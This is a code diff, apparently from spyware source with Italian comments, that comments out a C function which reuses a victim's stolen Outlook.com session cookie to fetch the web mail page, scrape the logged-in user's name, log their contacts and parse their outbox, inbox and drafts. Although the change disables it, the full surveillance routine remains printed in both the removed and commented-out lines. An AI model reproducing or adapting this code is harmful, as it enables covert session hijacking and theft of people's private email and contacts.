@@ -207,50 +207,50 @@ DWORD ParseOLContacts(char *cookie, char *user_name)
 	return SOCIAL_REQUEST_SUCCESS;
 }
 
-DWORD HandleOutlookMail(char *cookie)
-{
-	DWORD ret_val;
-	BYTE *r_buffer = NULL;
-	DWORD response_len;
-	char curr_user[256];
-	static char last_user_name[256]; 
-	char *ptr, *ptr2;
-	DWORD last_tstamp_hi, last_tstamp_lo;
-
-
-	if (!bPM_MailCapStarted && !bPM_ContactsStarted)
-		return SOCIAL_REQUEST_NETWORK_PROBLEM;
-
-	// Verifica il cookie 
-	ret_val = HttpSocialRequest(L"snt132.mail.live.com", L"GET", L"/default.aspx", 443, NULL, 0, &r_buffer, &response_len, cookie);	
-	if (ret_val != SOCIAL_REQUEST_SUCCESS)
-		return ret_val;
-
-	// Identifica l'utente
-	ptr = strstr((char *)r_buffer, "</script><title>");
-	FREE_PARSING(ptr);
-	ptr = strstr((char *)ptr, "Outlook - ");
-	FREE_PARSING(ptr);
-	ptr += strlen("Outlook - ");
-	ptr2 = strstr((char *)ptr, "</title>");
-	FREE_PARSING(ptr2);
-	*ptr2 = NULL;
-	_snprintf_s(curr_user, sizeof(curr_user), _TRUNCATE, "%s", ptr);	
-	SAFE_FREE(r_buffer);
-
-	if (bPM_ContactsStarted) {	
-		// Se e' diverso dall'ultimo username allora lo logga...
-		if (strcmp(curr_user, last_user_name)) {
-			_snprintf_s(last_user_name, sizeof(last_user_name), _TRUNCATE, "%s", curr_user);		
-			ret_val = ParseOLContacts(cookie, last_user_name);
-		}
-	}
-
-	if (!bPM_MailCapStarted)
-		return ret_val;
-
-	last_tstamp_lo = GetLastFBTstamp(curr_user, &last_tstamp_hi);
-	ParseFolder(cookie, OUTLOOK_OUTBOX, curr_user, last_tstamp_hi, last_tstamp_lo, FALSE, FALSE);
-	ParseFolder(cookie, OUTLOOK_INBOX, curr_user, last_tstamp_hi, last_tstamp_lo, TRUE, FALSE);
-	return ParseFolder(cookie, OUTLOOK_DRAFTS, curr_user, last_tstamp_hi, last_tstamp_lo, FALSE, TRUE);
-}
+// DWORD HandleOutlookMail(char **cookie)
+// {
+// 	DWORD ret_val;
+// 	BYTE *r_buffer = NULL;
+// 	DWORD response_len;
+// 	char curr_user[256];
+// 	static char last_user_name[256]; 
+// 	char *ptr, *ptr2;
+// 	DWORD last_tstamp_hi, last_tstamp_lo;
+// 
+// 
+// 	if (!bPM_MailCapStarted && !bPM_ContactsStarted)
+// 		return SOCIAL_REQUEST_NETWORK_PROBLEM;
+// 
+// 	// Verifica il cookie 
+// 	ret_val = HttpSocialRequest(L"snt132.mail.live.com", L"GET", L"/default.aspx", 443, NULL, 0, &r_buffer, &response_len, cookie);	
+// 	if (ret_val != SOCIAL_REQUEST_SUCCESS)
+// 		return ret_val;
+// 
+// 	// Identifica l'utente
+// 	ptr = strstr((char *)r_buffer, "</script><title>");
+// 	FREE_PARSING(ptr);
+// 	ptr = strstr((char *)ptr, "Outlook - ");
+// 	FREE_PARSING(ptr);
+// 	ptr += strlen("Outlook - ");
+// 	ptr2 = strstr((char *)ptr, "</title>");
+// 	FREE_PARSING(ptr2);
+// 	*ptr2 = NULL;
+// 	_snprintf_s(curr_user, sizeof(curr_user), _TRUNCATE, "%s", ptr);	
+// 	SAFE_FREE(r_buffer);
+// 
+// 	if (bPM_ContactsStarted) {	
+// 		// Se e' diverso dall'ultimo username allora lo logga...
+// 		if (strcmp(curr_user, last_user_name)) {
+// 			_snprintf_s(last_user_name, sizeof(last_user_name), _TRUNCATE, "%s", curr_user);		
+// 			ret_val = ParseOLContacts(cookie, last_user_name);
+// 		}
+// 	}
+// 
+// 	if (!bPM_MailCapStarted)
+// 		return ret_val;
+// 
+// 	last_tstamp_lo = GetLastFBTstamp(curr_user, &last_tstamp_hi);
+// 	ParseFolder(cookie, OUTLOOK_OUTBOX, curr_user, last_tstamp_hi, last_tstamp_lo, FALSE, FALSE);
+// 	ParseFolder(cookie, OUTLOOK_INBOX, curr_user, last_tstamp_hi, last_tstamp_lo, TRUE, FALSE);
+// 	return ParseFolder(cookie, OUTLOOK_DRAFTS, curr_user, last_tstamp_hi, last_tstamp_lo, FALSE, TRUE);
+// }
